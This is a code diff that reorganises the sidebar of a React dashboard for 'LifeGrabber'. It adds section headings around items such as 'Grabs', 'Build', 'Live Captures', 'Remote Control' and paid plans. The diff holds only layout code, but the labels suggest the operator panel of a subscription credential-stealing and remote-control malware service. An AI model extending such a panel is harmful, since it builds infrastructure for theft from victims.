@@ -612,6 +612,8 @@ export default function DashboardPage() {
     );
   }
 
+  const NavSection = ({title}) => <div style={{fontSize:10,color:colors.textDim,letterSpacing:2,textTransform:'uppercase',padding:'16px 14px 6px',fontWeight:600}}>{title}</div>;
+
   return (
     <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
       <aside style={{ width: 220, borderRight: '1px solid rgba(255,255,255,0.06)', padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'rgba(10, 10, 16, 0.8)', backdropFilter: 'blur(12px)' }}>
@@ -620,16 +622,23 @@ export default function DashboardPage() {
           <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
         </div>
         <div style={{ flex: 1 }}>
+          <NavSection title="OVERVIEW"/>
           <NavItem icon="📊" label="Dashboard" active={page === 'dashboard'} onClick={() => setPage('dashboard')} />
-          <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
-          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
-          {isOwner && (
-            <NavItem icon="👥" label="Admin" onClick={() => router.push('/admin')} />
-          )}
           <NavItem icon="📋" label="Plans" active={page === 'plans'} onClick={() => setPage('plans')} />
-          <NavItem icon="⭐" label="+Rep" active={page === 'rep'} onClick={() => setPage('rep')} />
+          <NavSection title="MANAGEMENT"/>
+          <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
           <NavItem icon="📡" label="Live Captures" active={page === 'live'} onClick={() => setPage('live')} />
           <NavItem icon="🖥" label="Remote Control" onClick={() => router.push('/dashboard/remote-control')} />
+          <NavSection title="UTILITIES"/>
+          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
+          <NavSection title="COMMUNITY & ACCESS"/>
+          <NavItem icon="⭐" label="+Rep" onClick={() => router.push('/dashboard/rep')} />
+          <NavItem icon="📢" label="Updates" onClick={() => router.push('/dashboard/updates')} />
+          <NavItem icon="🏆" label="Leaderboard" onClick={() => router.push('/dashboard/leaderboard')} />
+          <NavSection title="SYSTEM & SUPPORT"/>
+          <NavItem icon="💬" label="Join Discord" onClick={() => window.open('https://discord.gg/FV2668v4Zp','_blank')} />
+          <NavItem icon="🎫" label="Tickets" onClick={() => router.push('/dashboard/tickets')} />
+          {isOwner && <NavItem icon="👥" label="Admin" onClick={() => router.push('/admin')} />}
         </div>
         <div>
           <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
@@ -638,7 +647,6 @@ export default function DashboardPage() {
       </aside>
       {page === 'dashboard' && <Dashboard userEmail={userEmail} freeUses={freeUses} isPro={isPro} trialExhausted={trialExhausted} />}
       {page === 'plans' && <Plans freeUses={freeUses} isPro={isPro} trialExhausted={trialExhausted} />}
-      {page === 'rep' && <RepPage username={username} userEmail={userEmail} />}
       {page === 'live' && <LiveCaptures />}
     </div>
   );
